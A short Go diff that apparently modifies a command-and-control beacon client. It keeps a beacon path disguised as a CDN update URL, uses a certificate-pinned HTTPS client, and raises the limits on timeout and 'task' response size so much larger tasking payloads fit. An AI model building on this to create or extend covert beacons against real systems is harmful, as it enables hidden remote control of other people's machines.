@@ -13,7 +13,11 @@ import (
 	"time"
 )
 
-const beaconPath = "/cdn/static/update"
+const (
+	beaconPath                 = "/cdn/static/update"
+	maxHTTPSTaskResponseBytes  = 72 * 1024 * 1024
+	httpsBeaconResponseTimeout = 2 * time.Minute
+)
 
 // newPinnedClient returns an HTTP client that verifies the server's TLS
 // certificate matches the expected SHA-256 fingerprint.
@@ -54,7 +58,7 @@ func newPinnedClient(expectedFP []byte) *http.Client {
 	}
 	return &http.Client{
 		Transport: transport,
-		Timeout:   15 * time.Second,
+		Timeout:   httpsBeaconResponseTimeout,
 	}
 }
 
@@ -72,5 +76,12 @@ func sendBeaconHTTPS(client *http.Client, serverURL string, payload []byte) ([]b
 	if resp.StatusCode != http.StatusOK {
 		return nil, fmt.Errorf("server returned %d", resp.StatusCode)
 	}
-	return io.ReadAll(io.LimitReader(resp.Body, 64*1024))
+	data, err := io.ReadAll(io.LimitReader(resp.Body, maxHTTPSTaskResponseBytes+1))
+	if err != nil {
+		return nil, err
+	}
+	if len(data) > maxHTTPSTaskResponseBytes {
+		return nil, fmt.Errorf("server response exceeded %d bytes", maxHTTPSTaskResponseBytes)
+	}
+	return data, nil
 }
